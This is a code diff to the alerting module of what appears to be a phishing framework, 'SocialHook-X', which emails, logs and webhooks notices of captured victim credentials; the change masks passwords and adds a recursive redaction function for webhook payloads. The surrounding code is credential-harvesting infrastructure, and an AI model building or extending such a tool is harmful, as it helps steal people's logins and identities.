@@ -9,7 +9,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-from typing import List, Optional, Dict
+from typing import List, Dict
 
 logger = logging.getLogger(__name__)
 
@@ -92,6 +92,10 @@ class EmailNotifier:
         
         subject = f"[SocialHook-X] Credential Captured - {credential.get('template')}"
         
+        # Redact sensitive information in the alert
+        password = credential.get('password', '')
+        password_masked = '*' * len(password) if password else 'N/A'
+        
         body = f"""
 Credential Captured!
 
@@ -101,7 +105,7 @@ IP Address: {credential.get('ip_address')}
 Browser: {credential.get('browser')} on {credential.get('os')}
 
 Username/Email: {credential.get('username') or credential.get('email')}
-Password: {'*' * len(credential.get('password', ''))}
+Password: [{password_masked}]
 
 User Agent: {credential.get('user_agent')}
 
@@ -142,7 +146,7 @@ class AlertManager:
             try:
                 with open(self.log_file, 'a') as f:
                     f.write(f"\n{'='*60}\n")
-                    f.write(f"[CREDENTIAL CAPTURED]\n")
+                    f.write("[CREDENTIAL CAPTURED]\n")
                     f.write(f"Timestamp: {credential.get('timestamp')}\n")
                     f.write(f"Template: {credential.get('template')}\n")
                     f.write(f"IP: {credential.get('ip_address')}\n")
@@ -159,7 +163,27 @@ class AlertManager:
         
         # Send to webhooks
         if self.webhooks:
-            self._send_to_webhooks(credential)
+            self._send_to_webhooks(self._sanitize_webhook_payload(credential))
+    
+    @staticmethod
+    def _sanitize_webhook_payload(data):
+        """Recursively redact sensitive fields before sending to webhooks."""
+        sensitive_tokens = ("password", "pass", "secret", "token", "api_key", "apikey")
+        
+        if isinstance(data, dict):
+            sanitized = {}
+            for key, value in data.items():
+                key_lower = str(key).lower()
+                if any(token in key_lower for token in sensitive_tokens):
+                    sanitized[key] = "***REDACTED***"
+                else:
+                    sanitized[key] = AlertManager._sanitize_webhook_payload(value)
+            return sanitized
+        
+        if isinstance(data, list):
+            return [AlertManager._sanitize_webhook_payload(item) for item in data]
+        
+        return data
     
     def _send_to_webhooks(self, data: Dict):
         """Send data to configured webhooks"""
